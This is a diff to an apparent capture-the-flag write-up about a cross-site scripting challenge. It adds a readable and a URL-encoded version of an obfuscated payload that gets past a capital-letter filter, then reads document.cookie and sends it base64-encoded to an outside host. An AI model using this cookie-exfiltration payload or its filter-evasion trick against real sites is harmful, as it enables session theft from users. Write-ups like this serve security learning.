@@ -223,19 +223,29 @@ We had two solutions for this challenge (but I will outline some more at the end
 
 ```js
 "set" +
-  eval("'\\xa".substr(0, 3) + "54" + "'") +
-  "imeout(function(){" +
-  "fetcha".substr(0, 5) +
-  "('" +
-  "httpa".substr(0, 4) +
-  "://example" +
-  ".pla".substr(0, 2) +
-  "eex." +
-  "coma".substr(0, 3) +
-  "/?yeet='+btoa(document.cookie))},2000)";
+eval("'\\xa".substr(0, 3) + "54" + "'") +
+"imeout(function(){" +
+"fetcha".substr(0, 5) +
+"('" +
+"httpa".substr(0, 4) +
+"://example" +
+".pla".substr(0, 2) +
+"eex." +
+"coma".substr(0, 3) +
+"/?yeet='+btoa(document.cookie))},2000)";
 ```
 
 As caps were blocked, we needed to use an eval inside the eval to create a capital letter to build the `setTimeout` function name, that's what `eval('\'\\xa'.substr(0,3) + '54' + '\'')` is for. This builds `\x54` which results in `T`.
+
+In a readable format we get:
+```js
+setTimeout(function(){fetch('http://example.peex.com/?yeet='+btoa(document.cookie))},2000)"
+```
+
+The final payload URL that we report is:
+```
+http://localhost/?q=%3Cinput%20onfocusin%3D%22eval%28set%22%20%2Beval%28%22%27%5C%5Cxa%22%2Esubstr%280%2C%203%29%20%2B%20%2254%22%20%2B%20%22%27%22%29%20%2B%22imeout%28function%28%29%7B%22%20%2B%22fetcha%22%2Esubstr%280%2C%205%29%20%2B%22%28%27%22%20%2B%22httpa%22%2Esubstr%280%2C%204%29%20%2B%22%3A%2F%2Fexample%22%20%2B%22%2Epla%22%2Esubstr%280%2C%202%29%20%2B%22eex%2E%22%20%2B%22coma%22%2Esubstr%280%2C%203%29%20%2B%22%2F%3Fyeet%3D%27%2Bbtoa%28document%2Ecookie%29%29%7D%2C2000%29%29%22%3B%20autofocus%3E
+```
 
 This worked to grab the cookies from the remote, resulting in the flag:
 
